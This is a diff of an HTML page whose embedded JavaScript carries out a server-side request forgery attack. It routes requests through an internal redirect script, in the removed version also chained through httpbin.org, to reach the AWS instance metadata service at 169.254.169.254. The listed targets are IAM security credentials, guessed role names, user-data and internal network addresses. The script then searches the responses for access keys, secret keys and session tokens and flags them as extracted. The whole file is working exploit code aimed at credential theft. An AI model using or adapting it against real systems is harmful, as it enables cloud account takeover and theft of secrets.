@@ -1,82 +1,91 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Double Redirect AWS Attack</title>
+    <title>Internal Redirector Direct</title>
 </head>
 <body>
-    <h1>🔗 Double Redirect AWS Metadata Attack</h1>
+    <h1>🎯 Internal Redirector Direct AWS Attack</h1>
     <div id="results"></div>
     
     <script>
         var results = "";
         
-        // Use the confirmed working chain: httpbin.org → 127.0.0.1/redir.php → AWS metadata
-        var doubleRedirectTests = [
-            // Chain 1: httpbin.org → localhost redir → AWS metadata root
-            'http://httpbin.org/redirect-to?url=http://127.0.0.1/redir.php?url=http://169.254.169.254/latest/meta-data/',
+        // Since 127.0.0.1/redir.php works (176KB response), test it directly against AWS
+        var directTests = [
+            // Test confirmed working internal redirector against AWS metadata
+            'http://127.0.0.1/redir.php?url=http://169.254.169.254/latest/meta-data/',
+            'http://127.0.0.1/redir.php?url=http://169.254.169.254/latest/meta-data/iam/',
+            'http://127.0.0.1/redir.php?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/',
             
-            // Chain 2: httpbin.org → localhost redir → AWS IAM credentials
-            'http://httpbin.org/redirect-to?url=http://127.0.0.1/redir.php?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/',
+            // Try AWS metadata v1 (might not need token)
+            'http://127.0.0.1/redir.php?url=http://169.254.169.254/1.0/meta-data/',
+            'http://127.0.0.1/redir.php?url=http://169.254.169.254/1.0/meta-data/iam/security-credentials/',
             
-            // Chain 3: httpbin.org → localhost redir → AWS v1 metadata (might not need token)
-            'http://httpbin.org/redirect-to?url=http://127.0.0.1/redir.php?url=http://169.254.169.254/1.0/meta-data/',
-            'http://httpbin.org/redirect-to?url=http://127.0.0.1/redir.php?url=http://169.254.169.254/1.0/meta-data/iam/security-credentials/',
+            // Try older AWS versions
+            'http://127.0.0.1/redir.php?url=http://169.254.169.254/2007-01-19/meta-data/',
+            'http://127.0.0.1/redir.php?url=http://169.254.169.254/2008-02-01/meta-data/',
             
-            // Chain 4: Try older AWS API versions via double redirect
-            'http://httpbin.org/redirect-to?url=http://127.0.0.1/redir.php?url=http://169.254.169.254/2007-01-19/meta-data/',
-            'http://httpbin.org/redirect-to?url=http://127.0.0.1/redir.php?url=http://169.254.169.254/2008-02-01/meta-data/',
-            'http://httpbin.org/redirect-to?url=http://127.0.0.1/redir.php?url=http://169.254.169.254/2009-04-04/meta-data/',
+            // Try specific role names we've seen mentioned
+            'http://127.0.0.1/redir.php?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/S3Role',
+            'http://127.0.0.1/redir.php?url=http://169.254.169.254/1.0/meta-data/iam/security-credentials/S3Role',
             
-            // Chain 5: Try AWS user data via double redirect
-            'http://httpbin.org/redirect-to?url=http://127.0.0.1/redir.php?url=http://169.254.169.254/latest/user-data/',
-            'http://httpbin.org/redirect-to?url=http://127.0.0.1/redir.php?url=http://169.254.169.254/1.0/user-data/',
+            // Try user data
+            'http://127.0.0.1/redir.php?url=http://169.254.169.254/latest/user-data/',
+            'http://127.0.0.1/redir.php?url=http://169.254.169.254/1.0/user-data/',
             
-            // Chain 6: Test if we can get AWS token via double redirect 
-            'http://httpbin.org/redirect-to?url=http://127.0.0.1/redir.php?url=http://169.254.169.254/latest/api/token',
+            // Try without version prefix
+            'http://127.0.0.1/redir.php?url=http://169.254.169.254/meta-data/',
+            'http://127.0.0.1/redir.php?url=http://169.254.169.254/meta-data/iam/security-credentials/',
             
-            // Chain 7: Try direct role access (if we know role name)
-            'http://httpbin.org/redirect-to?url=http://127.0.0.1/redir.php?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/S3Role',
-            'http://httpbin.org/redirect-to?url=http://127.0.0.1/redir.php?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2Role',
-            'http://httpbin.org/redirect-to?url=http://127.0.0.1/redir.php?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/DefaultRole',
+            // Test basic connectivity confirmation
+            'http://127.0.0.1/redir.php?url=http://httpbin.org/get',
+            'http://127.0.0.1/redir.php?url=http://httpbin.org/ip',
             
-            // Chain 8: Test other internal services via double redirect
-            'http://httpbin.org/redirect-to?url=http://127.0.0.1/redir.php?url=http://localhost/',
-            'http://httpbin.org/redirect-to?url=http://127.0.0.1/redir.php?url=http://localhost/secret/',
-            'http://httpbin.org/redirect-to?url=http://127.0.0.1/redir.php?url=http://localhost/.env',
+            // Test if internal redirector can access itself
+            'http://127.0.0.1/redir.php?url=http://127.0.0.1/',
+            'http://127.0.0.1/redir.php?url=http://localhost/',
             
-            // Chain 9: Try to confirm the redirector works with simple test
-            'http://httpbin.org/redirect-to?url=http://127.0.0.1/redir.php?url=http://httpbin.org/get',
+            // Try other internal addresses 
+            'http://127.0.0.1/redir.php?url=http://172.16.0.1/',
+            'http://127.0.0.1/redir.php?url=http://10.0.0.1/',
+            'http://127.0.0.1/redir.php?url=http://192.168.1.1/',
         ];
         
-        for(var i = 0; i < doubleRedirectTests.length; i++) {
+        for(var i = 0; i < directTests.length; i++) {
             try {
-                results += "<h3>🔗 Chain " + (i+1) + ": " + doubleRedirectTests[i].split('127.0.0.1/redir.php?url=')[1] + "</h3>";
+                results += "<h3>🔍 " + (i+1) + ": " + directTests[i].split('url=')[1] + "</h3>";
                 var xhr = new XMLHttpRequest();
-                xhr.open('GET', 'http://localhost/redir.php?url=' + encodeURIComponent(doubleRedirectTests[i]), false);
+                xhr.open('GET', 'http://localhost/redir.php?url=' + encodeURIComponent(directTests[i]), false);
                 xhr.send();
                 
                 if(xhr.responseText && xhr.responseText.trim().length > 5) {
-                    results += "<div style='background:#e8f5e8;padding:10px;border:2px solid green;'>🎯 SUCCESS: " + xhr.responseText.length + " bytes</div>";
+                    results += "<div style='background:#e8f5e8;padding:10px;border:2px solid green;'>✅ RESPONSE: " + xhr.responseText.length + " bytes</div>";
                     
-                    // Look for AWS credentials
+                    // Check for AWS credentials
                     var text = xhr.responseText.toLowerCase();
                     if(text.includes('accesskeyid') || text.includes('secretaccesskey') || text.includes('sessiontoken')) {
-                        results += "<div style='background:#ff0000;color:white;padding:15px;border:3px solid red;'>🚨🚨🚨 AWS CREDENTIALS EXTRACTED! 🚨🚨🚨</div>";
+                        results += "<div style='background:#ff0000;color:white;padding:15px;border:4px solid red;font-weight:bold;'>🚨🚨🚨 AWS CREDENTIALS FOUND! 🚨🚨🚨</div>";
                     }
-                    if(text.includes('asia') && text.includes('secret') && text.includes('token')) {
-                        results += "<div style='background:#ff4500;color:white;padding:12px;border:3px solid orange;'>🔑 FULL AWS CREDENTIAL SET FOUND! 🔑</div>";
+                    if(text.includes('asia') && (text.includes('secret') || text.includes('key'))) {
+                        results += "<div style='background:#ff4500;color:white;padding:12px;border:3px solid orange;'>🔑 AWS ACCESS KEY DETECTED! 🔑</div>";
                     }
-                    if(text.includes('s3role') || text.includes('ec2role') || text.includes('iam')) {
-                        results += "<div style='background:#ffa500;color:white;padding:8px;'>🎯 IAM ROLE DETECTED!</div>";
+                    if(text.includes('token') && text.includes('expiration')) {
+                        results += "<div style='background:#32cd32;color:white;padding:10px;'>🎯 AWS SESSION TOKEN FOUND!</div>";
                     }
-                    if(text.includes('ami-') || text.includes('instance-') || text.includes('placement')) {
-                        results += "<div style='background:#74c0fc;padding:8px;'>☁️ AWS METADATA CONTENT!</div>";
+                    if(text.includes('s3role') || text.includes('ec2role')) {
+                        results += "<div style='background:#ffa500;color:white;padding:8px;'>🎭 IAM ROLE NAME FOUND!</div>";
+                    }
+                    if(text.includes('ami-') || text.includes('vpc-') || text.includes('subnet-')) {
+                        results += "<div style='background:#74c0fc;padding:8px;'>☁️ AWS INSTANCE METADATA!</div>";
                     }
                     if(text.includes('401') || text.includes('unauthorized')) {
-                        results += "<div style='background:#ffeaa7;padding:8px;'>⚠️ Still getting 401 (need different approach)</div>";
+                        results += "<div style='background:#ffeaa7;padding:8px;'>⚠️ 401 Unauthorized</div>";
+                    }
+                    if(text.includes('origin') && text.includes('54.209.100.76')) {
+                        results += "<div style='background:#98fb98;padding:8px;'>🌐 Confirmed SSRF working!</div>";
                     }
                     
-                    results += "<div style='background:#f0f0f0;padding:10px;max-height:200px;overflow:scroll;font-size:10px;white-space:pre-wrap;word-wrap:break-word;'>" + xhr.responseText + "</div>";
+                    results += "<div style='background:#f0f0f0;padding:10px;max-height:250px;overflow:scroll;font-size:10px;white-space:pre-wrap;word-wrap:break-word;'>" + xhr.responseText + "</div>";
                 } else {
                     results += "<div style='background:#ffe8e8;padding:3px;'>❌ No response</div>";
                 }
